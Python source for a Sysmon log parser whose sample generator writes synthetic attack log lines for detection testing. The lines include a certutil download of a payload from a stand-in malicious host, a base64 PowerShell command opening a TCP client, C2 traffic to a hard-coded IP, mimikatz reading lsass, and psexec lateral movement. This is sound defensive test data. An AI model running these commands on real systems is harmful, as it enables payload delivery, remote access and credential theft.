"""
Sysmon Log Parser

Parses Microsoft Sysmon (System Monitor) log format.
Sysmon provides detailed information about process creations, network connections,
file creation, and other system events useful for threat detection.

Sysmon Log Format Example:
2024-01-15 10:30:45.123 UTC;EventID 1;ProcessCreate;Computer=WORKSTATION01;User=DOMAIN\john;ProcessId=1234;ProcessName=C:\Windows\System32\cmd.exe;CommandLine=cmd.exe /c whoami
"""

from typing import List, Dict, Any, Optional
from datetime import datetime, timedelta
import random
import re

from src.parsers.base_parser import BaseParser, LogEvent


class SysmonParser(BaseParser):
    """Parser for Microsoft Sysmon log files."""
    
    # Sysmon Event IDs and their descriptions
    EVENT_TYPES = {
        1: 'ProcessCreate',
        2: 'FileCreateTime',
        3: 'NetworkConnect',
        4: 'SysmonServiceStateChange',
        5: 'ProcessTerminate',
        6: 'DriverLoad',
        7: 'ImageLoad',
        8: 'CreateRemoteThread',
        9: 'RawAccessRead',
        10: 'ProcessAccess',
        11: 'FileCreate',
        12: 'RegistryObjectAddOrDelete',
        13: 'RegistrySetValue',
        14: 'RegistryRenameKey',
        15: 'FileCreateStreamHash',
        16: 'SysmonConfigurationChange',
        17: 'PipeCreated',
        18: 'PipeConnected',
        19: 'WmiEventFilterActivity',
        20: 'WmiEventConsumerActivity',
        21: 'WmiEventConsumerToFilter',
        22: 'DNSQuery',
        23: 'FileDelete',
        24: 'ClipboardChange',
        25: 'ProcessTampering',
        26: 'FileDeleteDetected',
        27: 'FileBlockExecutable',
        28: 'FileBlockShredding',
        29: 'ExecutableImageLoaded',
    }
    
    # Suspicious processes for sample generation
    SUSPICIOUS_PROCESSES = [
        r'C:\Windows\System32\cmd.exe',
        r'C:\Windows\System32\powershell.exe',
        r'C:\Windows\System32\wscript.exe',
        r'C:\Windows\System32\cscript.exe',
        r'C:\Windows\System32\mshta.exe',
        r'C:\Windows\System32\certutil.exe',
        r'C:\Windows\System32\bitsadmin.exe',
        r'C:\Users\Admin\AppData\Local\Temp\malware.exe',
        r'C:\ProgramData\update.exe',
    ]
    
    # Normal processes for sample generation
    NORMAL_PROCESSES = [
        r'C:\Windows\explorer.exe',
        r'C:\Windows\System32\svchost.exe',
        r'C:\Windows\System32\lsass.exe',
        r'C:\Windows\System32\services.exe',
        r'C:\Program Files\Google\Chrome\Application\chrome.exe',
        r'C:\Program Files\Mozilla Firefox\firefox.exe',
        r'C:\Program Files\Microsoft Office\Office16\WINWORD.EXE',
        r'C:\Program Files\Microsoft Office\Office16\EXCEL.EXE',
    ]
    
    def __init__(self):
        super().__init__('sysmon')
    
    def parse_line(self, line: str) -> Optional[LogEvent]:
        """
        Parse a single Sysmon log line.
        
        Expected format:
        timestamp;EventID X;EventType;Field1=Value1;Field2=Value2;...
        """
        if not line or not line.strip():
            return None
        
        try:
            # Split by semicolon
            parts = line.strip().split(';')
            if len(parts) < 3:
                return None
            
            # Parse timestamp (first part)
            timestamp_str = parts[0].strip()
            timestamp = self.parse_timestamp(timestamp_str)
            if not timestamp:
                # Try alternative format without timezone
                timestamp_str_clean = timestamp_str.replace(' UTC', '').replace('UTC', '')
                timestamp = self.parse_timestamp(timestamp_str_clean)
            
            # Parse EventID (second part)
            event_id_part = parts[1].strip()
            event_id_match = re.search(r'EventID\s*(\d+)', event_id_part)
            if not event_id_match:
                return None
            event_id = int(event_id_match.group(1))
            
            # Parse EventType (third part)
            event_type = parts[2].strip() if len(parts) > 2 else 'Unknown'
            
            # Parse remaining fields
            fields = {}
            for part in parts[3:]:
                if '=' in part:
                    key, value = part.split('=', 1)
                    fields[key.strip()] = value.strip()
            
            # Create LogEvent
            event = LogEvent(
                timestamp=timestamp or datetime.now(),
                source_type='sysmon',
                raw_log=line,
                event_id=str(event_id),
                event_type=event_type,
                **fields
            )
            
            # Extract common fields
            if 'ProcessName' in fields:
                event.fields['process_name'] = fields['ProcessName'].split('\\')[-1]
                event.fields['process_path'] = fields['ProcessName']
            
            if 'CommandLine' in fields:
                event.fields['command_line'] = fields['CommandLine']
            
            if 'User' in fields:
                event.fields['user'] = fields['User']
            
            if 'SourceIp' in fields or 'SrcIp' in fields:
                event.fields['src_ip'] = fields.get('SourceIp', fields.get('SrcIp', ''))
            
            if 'DestinationIp' in fields or 'DestIp' in fields:
                event.fields['dest_ip'] = fields.get('DestinationIp', fields.get('DestIp', ''))
            
            if 'DestinationPort' in fields or 'DestPort' in fields:
                port_str = fields.get('DestinationPort', fields.get('DestPort', '0'))
                event.fields['dest_port'] = int(port_str) if port_str.isdigit() else 0
            
            if 'Image' in fields:
                event.fields['image_path'] = fields['Image']
            
            if 'Hashes' in fields:
                event.fields['file_hash'] = fields['Hashes']
            
            if 'TargetFilename' in fields:
                event.fields['target_file'] = fields['TargetFilename']
            
            if 'Computer' in fields:
                event.fields['computer'] = fields['Computer']
            
            return event
            
        except Exception as e:
            return None
    
    def generate_sample_logs(self, count: int = 100) -> List[str]:
        """Generate realistic sample Sysmon logs including some malicious activity."""
        logs = []
        base_time = datetime.now() - timedelta(hours=2)
        
        computers = ['WORKSTATION01', 'WORKSTATION02', 'SERVER01', 'SERVER02']
        users = ['DOMAIN\\john', 'DOMAIN\\alice', 'DOMAIN\\bob', 'ADMIN\\administrator', 'SYSTEM']
        
        # Generate normal activity (70%)
        normal_count = int(count * 0.7)
        for i in range(normal_count):
            timestamp = base_time + timedelta(seconds=i * 10)
            event_id = random.choice([1, 3, 11, 22])  # Common events
            event_type = self.EVENT_TYPES.get(event_id, 'Unknown')
            computer = random.choice(computers)
            user = random.choice(users)
            process = random.choice(self.NORMAL_PROCESSES)
            process_name = process.split('\\')[-1]
            pid = random.randint(1000, 65000)
            
            if event_id == 1:  # ProcessCreate
                log = f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} UTC;EventID {event_id};{event_type};Computer={computer};User={user};ProcessId={pid};ProcessName={process};CommandLine={process_name}.exe"
            elif event_id == 3:  # NetworkConnect
                dest_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
                dest_port = random.choice([80, 443, 8080, 3306, 5432])
                log = f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} UTC;EventID {event_id};{event_type};Computer={computer};User={user};ProcessName={process};SourceIp=192.168.1.100;DestinationIp={dest_ip};DestinationPort={dest_port};Protocol=tcp"
            elif event_id == 11:  # FileCreate
                file_path = f"C:\\Users\\{user.split(chr(92))[-1]}\\Documents\\file{i}.docx"
                log = f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} UTC;EventID {event_id};{event_type};Computer={computer};User={user};ProcessName={process_name};TargetFilename={file_path}"
            elif event_id == 22:  # DNSQuery
                domain = random.choice(['google.com', 'microsoft.com', 'github.com', 'amazon.com'])
                log = f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} UTC;EventID {event_id};{event_type};Computer={computer};User={user};ProcessName={process_name};QueryName={domain};QueryStatus=SUCCESS"
            
            logs.append(log)
        
        # Generate suspicious/malicious activity (30%)
        suspicious_count = count - normal_count
        attacker_ip = "185.220.101.45"  # Known bad IP
        
        for i in range(suspicious_count):
            timestamp = base_time + timedelta(seconds=(normal_count + i) * 5)
            computer = random.choice(computers)
            
            attack_type = random.choice([
                'powershell_encoded',
                'lolbin_execution',
                'c2_communication',
                'credential_dump',
                'lateral_movement'
            ])
            
            if attack_type == 'powershell_encoded':
                user = 'DOMAIN\\john'
                process = r'C:\Windows\System32\powershell.exe'
                cmd = 'powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA='
                log = f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} UTC;EventID 1;ProcessCreate;Computer={computer};User={user};ProcessId={random.randint(1000,65000)};ProcessName={process};CommandLine={cmd}"
            
            elif attack_type == 'lolbin_execution':
                user = 'ADMIN\\administrator'
                lolbin = random.choice([
                    r'C:\Windows\System32\certutil.exe',
                    r'C:\Windows\System32\bitsadmin.exe',
                    r'C:\Windows\System32\mshta.exe'
                ])
                lolbin_name = lolbin.split('\\')[-1]
                cmd = f'{lolbin_name} -urlcache -split -f http://malicious.com/payload.exe C:\\temp\\payload.exe'
                log = f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} UTC;EventID 1;ProcessCreate;Computer={computer};User={user};ProcessId={random.randint(1000,65000)};ProcessName={lolbin};CommandLine={cmd}"
            
            elif attack_type == 'c2_communication':
                user = random.choice(users)
                process = random.choice(self.NORMAL_PROCESSES)
                process_name = process.split('\\')[-1]
                c2_ip = "185.220.101.45"
                c2_port = random.choice([443, 8443, 4444])
                log = f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} UTC;EventID 3;NetworkConnect;Computer={computer};User={user};ProcessName={process_name};SourceIp=192.168.1.100;DestinationIp={c2_ip};DestinationPort={c2_port};Protocol=tcp"
            
            elif attack_type == 'credential_dump':
                user = 'SYSTEM'
                process = r'C:\Windows\System32\lsass.exe'
                accessing_process = r'C:\Users\Admin\AppData\Local\Temp\mimikatz.exe'
                log = f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} UTC;EventID 10;ProcessAccess;Computer={computer};User={user};SourceProcessName={accessing_process};TargetProcessName={process};GrantedAccess=0x1FFFFF"
            
            elif attack_type == 'lateral_movement':
                user = 'DOMAIN\\admin'
                process = r'C:\Windows\System32\psexec.exe'
                target_host = f"WORKSTATION0{random.randint(1,2)}"
                log = f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} UTC;EventID 1;ProcessCreate;Computer={computer};User={user};ProcessId={random.randint(1000,65000)};ProcessName={process};CommandLine=psexec.exe \\\\{target_host} cmd.exe"
            
            logs.append(log)
        
        # Sort by timestamp (approximately)
        return logs
